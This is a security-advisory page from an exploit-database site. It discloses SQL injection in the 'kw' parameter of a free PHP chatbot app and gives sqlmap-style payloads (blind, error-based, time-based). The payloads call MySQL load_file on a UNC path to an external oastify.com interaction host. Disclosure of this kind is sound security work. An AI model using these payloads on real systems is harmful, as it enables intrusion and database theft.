---
title: Chat Bot 1.0 SQL Injection
url: https://cxsecurity.com/issue/WLB-2024050063
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-05-23
fetch_date: 2025-10-06T16:48:24.064254
---

# Chat Bot 1.0 SQL Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Chat Bot 1.0 SQL Injection** **2024.05.22**  Credit:  **[nu11secur1ty](https://cxsecurity.com/author/nu11secur1ty/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-89](https://cxsecurity.com/cwe/CWE-89 "Click to see CWE-89")** | |

## Titles: Chat Bot - PHP (by: oretnom23 ) v1.0 Multiple SQLi
## Author: nu11secur1ty
## Date: 05/22/2024
## Vendor: https://github.com/oretnom23
## Software:
https://www.sourcecodester.com/php/15316/chatbot-app-suggestion-phpoop-free-source-code.html
## Reference: https://portswigger.net/web-security/sql-injection
## Description:
The `kw` parameter appears to be vulnerable to SQL injection attacks. The
payload '+(select load\_file('\\\\
3x1lin0l3hlhoereknh4upxdx43xrufli9aw0kp.oastify.com\\rvo'))+' was submitted
in the kw parameter. This payload injects a SQL sub-query that calls
MySQL's load\_file function with a UNC file path that references a URL on an
external domain. The application interacted with that domain, indicating
that the injected SQL query was executed. The attacker can get all
information from the system by using this vulnerability!
STATUS: HIGH- Vulnerability
[+]Exploits:
- SQLi Multiple:
```mysql
---
Parameter: kw (POST)
Type: boolean-based blind
Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
Payload: kw=Write your query here'+(select load\_file('\\\\
3x1lin0l3hlhoereknh4upxdx43xrufli9aw0kp.oastify.com\\rvo'))+'') OR NOT
5452=5452-- yJrL
Type: error-based
Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP
BY clause (FLOOR)
Payload: kw=Write your query here'+(select load\_file('\\\\
3x1lin0l3hlhoereknh4upxdx43xrufli9aw0kp.oastify.com\\rvo'))+'') AND (SELECT
6898 FROM(SELECT COUNT(\*),CONCAT(0x717a6a7171,(SELECT
(ELT(6898=6898,1))),0x717a6b7171,FLOOR(RAND(0)\*2))x FROM
INFORMATION\_SCHEMA.PLUGINS GROUP BY x)a)-- ugYc
Type: time-based blind
Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
Payload: kw=Write your query here'+(select load\_file('\\\\
3x1lin0l3hlhoereknh4upxdx43xrufli9aw0kp.oastify.com\\rvo'))+'') AND (SELECT
3334 FROM (SELECT(SLEEP(7)))MjoP)-- WPgB
---
```
## Reproduce:
[href](https://www.patreon.com/posts/chat-bot-php-by-104709713)
## Proof and Exploit:
[href](
https://www.nu11secur1ty.com/2024/05/mvogms-by-oretnom23-v10-multiple-sqli\_22.html
)
## Time spent:
01:19:00

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2024050063)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top